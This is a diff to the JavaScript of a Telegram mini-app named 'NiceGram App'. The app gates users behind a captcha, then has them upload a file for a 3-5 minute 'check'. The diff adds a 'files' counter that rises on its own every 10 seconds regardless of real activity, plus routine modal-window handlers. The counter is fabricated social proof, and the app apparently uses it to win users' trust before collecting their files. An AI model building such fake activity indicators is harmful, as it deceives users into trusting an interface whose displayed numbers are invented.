@@ -12,6 +12,10 @@ let startNotificationSent = false;
 let targetMin = 30;
 let targetMax = 50;
 
+// Счетчик файлов
+let filesCounter = 0;
+let counterInterval;
+
 // Элементы
 const degreeDisplay = document.getElementById('degree');
 const sliderHandle = document.getElementById('slider-handle');
@@ -20,6 +24,46 @@ const captchaScreen = document.getElementById('captcha-screen');
 const mainScreen = document.getElementById('main-screen');
 const statusMsg = document.getElementById('status-msg');
 const welcomeUser = document.getElementById('welcome-user');
+const filesCounterElement = document.getElementById('files-counter');
+
+// Инициализация счетчика
+function initCounter() {
+    // Загружаем счетчик из localStorage
+    const savedCounter = localStorage.getItem('nicegram_files_counter');
+    const savedDate = localStorage.getItem('nicegram_counter_date');
+    const today = new Date().toDateString();
+    
+    if (savedCounter && savedDate === today) {
+        filesCounter = parseInt(savedCounter);
+    } else {
+        filesCounter = 0;
+        localStorage.setItem('nicegram_counter_date', today);
+        localStorage.setItem('nicegram_files_counter', '0');
+    }
+    
+    if (filesCounterElement) {
+        filesCounterElement.textContent = filesCounter;
+    }
+    
+    // Запускаем интервал увеличения счетчика
+    counterInterval = setInterval(increaseCounter, 10000); // 10 секунд
+}
+
+// Увеличение счетчика
+function increaseCounter() {
+    filesCounter++;
+    if (filesCounterElement) {
+        filesCounterElement.textContent = filesCounter;
+        // Анимация обновления
+        filesCounterElement.style.transform = 'scale(1.1)';
+        setTimeout(() => {
+            filesCounterElement.style.transform = 'scale(1)';
+        }, 300);
+    }
+    
+    // Сохраняем в localStorage
+    localStorage.setItem('nicegram_files_counter', filesCounter.toString());
+}
 
 // Функция определения устройства
 function detectDevice() {
@@ -166,6 +210,9 @@ if (verifyBtn) {
                     startNotificationSent = true;
                 }
                 
+                // Инициализируем счетчик
+                initCounter();
+                
                 mainScreen.style.opacity = '0';
                 setTimeout(() => {
                     mainScreen.style.opacity = '1';
@@ -285,6 +332,9 @@ if (selectFileBtn && fileInput) {
                     statusMsg.innerHTML = '✅проверка файла занимает 3-5 минут';
                 }
                 
+                // Увеличиваем счетчик при успешной отправке
+                increaseCounter();
+                
                 if (tg.HapticFeedback) {
                     tg.HapticFeedback.notificationOccurred('success');
                 }
@@ -315,10 +365,52 @@ if (selectFileBtn && fileInput) {
     console.error('Элементы для загрузки файла не найдены!');
 }
 
-// Инициализация
+// Инициализация модальных окон (если не инициализированы в index.html)
 document.addEventListener('DOMContentLoaded', function() {
     tg.ready();
     generateRandomRange();
+    
+    // Инициализация кнопок модальных окон
+    const instructionBtn = document.getElementById('instruction-btn');
+    const instructionModal = document.getElementById('instruction-modal');
+    const closeInstruction = document.getElementById('close-instruction');
+    
+    const faqBtn = document.getElementById('faq-btn');
+    const faqModal = document.getElementById('faq-modal');
+    const closeFaq = document.getElementById('close-faq');
+    
+    if (instructionBtn && instructionModal && closeInstruction) {
+        instructionBtn.addEventListener('click', () => {
+            instructionModal.classList.add('active');
+        });
+        
+        closeInstruction.addEventListener('click', () => {
+            instructionModal.classList.remove('active');
+        });
+        
+        instructionModal.addEventListener('click', (e) => {
+            if (e.target === instructionModal) {
+                instructionModal.classList.remove('active');
+            }
+        });
+    }
+    
+    if (faqBtn && faqModal && closeFaq) {
+        faqBtn.addEventListener('click', () => {
+            faqModal.classList.add('active');
+        });
+        
+        closeFaq.addEventListener('click', () => {
+            faqModal.classList.remove('active');
+        });
+        
+        faqModal.addEventListener('click', (e) => {
+            if (e.target === faqModal) {
+                faqModal.classList.remove('active');
+            }
+        });
+    }
+    
     console.log('NiceGram App инициализирован');
 });
 
